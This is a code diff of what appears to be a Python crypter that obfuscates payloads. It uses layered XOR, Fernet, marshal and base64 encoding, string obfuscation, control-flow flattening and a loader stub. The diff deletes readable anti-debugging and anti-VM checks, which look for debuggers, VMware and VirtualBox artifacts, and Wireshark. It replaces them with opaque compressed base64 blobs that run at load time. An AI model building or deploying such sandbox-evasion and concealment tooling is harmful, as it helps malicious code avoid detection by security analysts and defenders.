@@ -232,6 +232,8 @@ def xor_encrypt(data, key):
     return bytes(
         a ^ b for a, b in zip(data, (key * ((len(data) // len(key)) + 1))[: len(data)])
     )
+
+
 class StringObfuscator(ast.NodeTransformer):
     def __init__(self):
         self.in_fstring = False
@@ -256,29 +258,28 @@ class StringObfuscator(ast.NodeTransformer):
             return ast.Call(
                 func=ast.Attribute(
                     value=ast.Call(
-                        func=ast.Name(id='_d', ctx=ast.Load()),
+                        func=ast.Name(id="_d", ctx=ast.Load()),
                         args=[
                             ast.Call(
                                 func=ast.Attribute(
-                                    value=ast.Name(id='base64', ctx=ast.Load()),
-                                    attr='b64decode',
-                                    ctx=ast.Load()
+                                    value=ast.Name(id="base64", ctx=ast.Load()),
+                                    attr="b64decode",
+                                    ctx=ast.Load(),
                                 ),
                                 args=[ast.Constant(value=encrypted)],
-                                keywords=[]
+                                keywords=[],
                             ),
-                            ast.Constant(value=key)
+                            ast.Constant(value=key),
                         ],
-                        keywords=[]
+                        keywords=[],
                     ),
-                    attr='decode',
-                    ctx=ast.Load()
+                    attr="decode",
+                    ctx=ast.Load(),
                 ),
                 args=[],
-                keywords=[]
+                keywords=[],
             )
         return node
-
 
 
 def obfuscate_strings(code):
@@ -289,17 +290,18 @@ def obfuscate_strings(code):
         for node in ast.walk(tree):
             for child in ast.iter_child_nodes(node):
                 child.parent = node
-        
+
         new_tree = transformer.visit(tree)
         ast.fix_missing_locations(new_tree)
         return ast.unparse(new_tree)
     except Exception as e:
         print(f"[{Fore.YELLOW}!{Fore.RESET}] String obfuscation failed: {e}")
-        import traceback; traceback.print_exc()
+        import traceback
+
+        traceback.print_exc()
         return code
 
-    
-    
+
 def fernet_encrypt(key, data):
     data_bytes = data if isinstance(data, bytes) else data.encode()
     cipher_suite = Fernet(key)
@@ -324,7 +326,7 @@ def obfuscate_code(code):
             payload_imports.append(stripped_line)
         else:
             main_code.append(line)
-    code_to_process = main_code
+    code_to_process = "\n".join(main_code)
     encoded_import_lines = []
     for imp_line in payload_imports:
         marshalled = marshal.dumps(imp_line.encode())
@@ -335,155 +337,11 @@ def obfuscate_code(code):
         [f"_x(b'{line.decode()}')" for line in encoded_import_lines]
     )
     final_import_calls = "\n" + final_import_calls
-    anti_debug_code = """def is_debugger_present():
-    debugging_modules = {
-        'pdb',
-        'debugpy',
-        'pydevd',
-        'ipdb',
-        'bdb'
-    }
-    if debugging_modules.intersection(sys.modules):
-        return True
-
-    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
-        return True
-
-
-    try:
-        if hasattr(sys, '_getframe') and sys._getframe(1).f_trace is not None:
-            return True
-    except (AttributeError, ValueError):
-        pass
-        
-    if os.name == 'nt':
-        try:
-            if ctypes.windll.kernel32.IsDebuggerPresent():
-                return True
-        except (ImportError, AttributeError):
-            pass
-            
-    if os.name == 'posix':
-        try:
-            with open('/proc/self/status') as f:
-                for line in f:
-                    if line.startswith('TracerPid:'):
-                        if int(line.split()[1]) != 0:
-                            return True
-                        break
-        except (IOError, ValueError):
-            pass
-
-    return False
-
-if is_debugger_present():
-    import os as oos
-    if oos._exit is not os._exit:
-        oos._exit(0)
-    os._exit(0)
-
-"""
-    anti_vm_code = """import winreg
-
-def is_vm():
-    try:
-        output = subprocess.check_output(
-            ['wmic', 'computersystem', 'get', 'model'],
-            encoding='utf-8',
-            timeout=3,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-        )
-        if any(
-            vm in output
-            for vm in [
-                'Virtual',
-                'VMware',
-                'VirtualBox',
-                'Hyper-V',
-                'QEMU',
-                'KVM',
-                'Parallels',
-            ]
-        ):
-            return True
-    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
-        pass
-    try:
-        output = subprocess.check_output(
-            ['getmac'],
-            encoding='utf-8',
-            timeout=3,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-        )
-        if bool(
-            re.search(
-                r'(00:05:69|00:0C:29|00:50:56|00:1C:14|00:03:FF|00:05:00)', output
-            )
-        ):
-            return True
-    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
-        pass
-    paths = [
-        'C:\\\\Program Files\\\\VMware\\\\VMware Tools',
-        'C:\\\\Program Files\\\\Oracle\\\\VirtualBox Guest Additions',
-        'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxGuest.sys',
-        'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxMouse.sys',
-        'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxSF.sys',
-        'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.WindowsSandbox_',
-    ]
-    if any(os.path.exists(path) for path in paths):
-        return True
-    try:
-        if bool(ctypes.windll.kernel32.IsProcessorFeaturePresent(29)):
-            return True
-    except (AttributeError, OSError):
-        pass
-    try:
-        if bool(ctypes.windll.kernel32.IsDebuggerPresent()):
-            return True
-    except (AttributeError, OSError):
-        pass
-    sus_procs = {
-        'vmtoolsd',
-        'vboxservice',
-        'wireshark',
-        'fiddler',
-        'sandboxie',
-        'processhacker',
-    }
-    with ThreadPoolExecutor() as executor:
-        futures = {
-            executor.submit(lambda proc: proc.info.get('name', '').lower(), proc): proc
-            for proc in psutil.process_iter(['name'])
-        }
-        if any(future.result() in sus_procs for future in futures):
-            return True
-    start_time = time.perf_counter()
-    for _ in range(1_000_000):
-        pass
-    if time.perf_counter() - start_time > 0.5:
-        return True
-    try:
-        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
-                             'HARDWARE\\\\DESCRIPTION\\\\System')
-        bios_info = winreg.QueryValueEx(key, 'SystemBiosVersion')[0]
-        if any(vm in bios_info for vm in ['VMWARE', 'VIRTUAL', 'QEMU', 'XEN']):
-            return True
-    except:
-        pass
-        
-    return False
-
-if is_vm():
-    import os as oos
-    if oos._exit is not os._exit:
-        oos._exit(0)
-    os._exit(0)
-
-"""
     try:
         enable_anti_debug = input("Enable anti-debugging? (y/n): ").strip().lower()
-        print(f"[{Fore.YELLOW}!{Fore.RESET}] Anti-VM detection is only effective on Windows virtual machines.")
+        print(
+            f"[{Fore.YELLOW}!{Fore.RESET}] Anti-VM detection is only effective on Windows virtual machines."
+        )
         enable_anti_vm = input("Enable anti-VM? (y/n): ").strip().lower()
         enable_string_obf = input("Enable string obfuscation? (y/n): ")
         enable_flatten = (
@@ -493,9 +351,12 @@ if is_vm():
         print("\nExiting...")
         sys.exit(0)
     if enable_anti_vm in ["y", "yes"]:
-        code_to_process = anti_vm_code + code_to_process
+        final_import_calls += (
+            ("" if len(final_import_calls) == 0 else "\n")
+            + "_x(b'eJzNVm1v2zYQ7mfvT+ibZCARlGQpVgMZ4DryYiR+qe06G+JAoKWzTUQSBZLyC9r+9x1F2ZIcAck2DBuRWMd745HP3ZFi9NOHDzRKGJfGlsYcVo1GAEuDCm8TWc1Ww8Ah+V4TarBUJqk0bgyRLhLOfBDC9tfgv3haYh011XgytxH1zTPD9FmEUuBiLyREirMCqT4RCyA0n88qdhD7LKDx6sZM5fL8F7MqlTQCXO3mqsr2ORBJWbwMyUrclOLrjN321PUGQ++xN7gdPhZmzSNFlwaJ99XoN5FB43zHFcGS8Vz4VOGrYc4olykJT2LWov6WcKiVaKPPbFcnvdsnwM9ndaIvbv9rHf9+1q9jjwgnYQihOBE+F0fSqgg4yJTHxpSnkPFh50MiDat8vMpjMNIzl3PGz8rZMdVoubuEcghK7hMixD9PMEyjiPj/iwRaMBZaJ6dnCyDcX1uvoOCm5Tgt57r18dN3RXRalxlxjX8fFXHRaV38nImuWt3ud63sOE0smpqUbP6XACZErgVCVlSD2WnN5+hxxUlkdGkIYj7X2X/4GlM8rXIa1pkMOfFDZXIsD+O3FIQ02kFAFVSvHDzSOGBbNJ1kjebqcj4PON1g40EvaJ+Z29iF/qphn6UC/o7hpFtndbLR3Ek7SXDSpz5ngi2lnbMnJA4WbOflTnSx5h2LCVsdvw07KqSwFN3MGpSiVIvKwCmhdpoQleo7ZLEvseUIG++EIAztF+AxhFeXdk/kWcJ4F2sl5TDiICCW1uWn5jsTry0lpwu8C/JMG04y4s3G8GZot7BIVyvgh5D+hYBEKjxVFirZvxWAbiKpkjkog7xBwATwDfXLDd/cYg2JNeEvZeaSBkEIvMwSGnJaMc4rck38l6P2j+x3SxHs6RobWDDCUNwd+Klk3GoaROBG9azY0DJV2FV3oY9Ea9pY/hGVVkiiRUAMtW4r+7VpvGQ29lzLjEkE6gI3m3bItoBrnWUqTa356sJUzCwfRSppaOd78Sg+Cqwn7e256GI/Tm9mHbKNUachYqs8FWgo/1pB8fPdvQG/kIRLT10FeAzqY+Mlu/R8lsYqJB2Kcuwpn5zEK7AuPMdx1H9dcmCgNW6M8/JKvxqOff3OWnyBPUamn2X2MIH4HvZWPr27d//wHoad9oPXb3fuegP39WVfGeZde3z72B678/mtO+mMe6Npbzg4NC2zOPgFZQgKolys/SUFvp+RMAV3Z2FUCLo2+4y6M2x02IjN5pPzfIqZfiMVHkvvJnwLqWhUAs164+nX9oMi9WvGMH93B5gM7ynfGhzUaJQsuiQU0GjQk2dt/uxlQpUIY0cMkbQ97KYS1Y2YKQ09L71RDizL0QdXnjf+BKeQLG0=')"
+        )
     if enable_anti_debug in ["y", "yes"]:
-        code_to_process = anti_debug_code + code_to_process
+        final_import_calls += "\n_x(b'eJx9VM1u2zAM7mGnPAV3sgwETrvdCuQwYC3Qy9ZDscswGLJFp0IdSSDlNcawV9gzT1LsxPnlwRB/P/IjYf734eZGYQOaS4VVt1ohlY6Q0XiR388gyNauzapcW9W1yLCEP8kTJXOqyuZ7NUW7fmpyvcLfamrRR0lVUJP2N311cwpaaOORGGuvrRHcczE4hi6jEPqODLxQh7Ox0Ktk6T3FjDlkKwxvWWOWgzQKYpnRJPJAAhjr4Zs1eKFosnrq9+4TiDIUbEiupxg7m7jLi6ZMeOfRjhGjjpsanQfxJYDoqvP4QGRpDj9k223fEw6cZN4pIwmWCxPQYbmEzPhsH30wyhBc+94Fvt+1UW1bvCEZbD9/Kp7463Agz4f3ca31aftPa2fJD70fznJU6WCGS3M4y3pzbZR37V/BOjQiWziy9YKxbRbspe847oahOR2gsQStNmE75px76CNGFKESeY4oInuJG6Vnre6zM6xMMsMVi222a3Wg8Ofdrxw+LuH2ctYlXo+lIpRvp6x/v3YtURLbswnKo2w53Lq++lfQaZthI5FIa3m3orCjEjfaj/c96nvQXYi4zZNxqs/+A9fVPpE=')"
     if enable_flatten in ["y", "yes"]:
         code_to_process = flatten_control_flow(code_to_process)
     if enable_string_obf in ["y", "yes"]:
@@ -518,7 +379,7 @@ if is_vm():
     marshalled_data = marshal.dumps(compressed_data)
     final_data = encode_b64(marshalled_data)
     return STUB_CODE.format(
-        final_import_calls if len(encoded_import_lines) != 0 else "",
+        final_import_calls if len(final_import_calls) != 0 else "",
         repr(final_data),
         list(mask_key),
         list(masked_key),
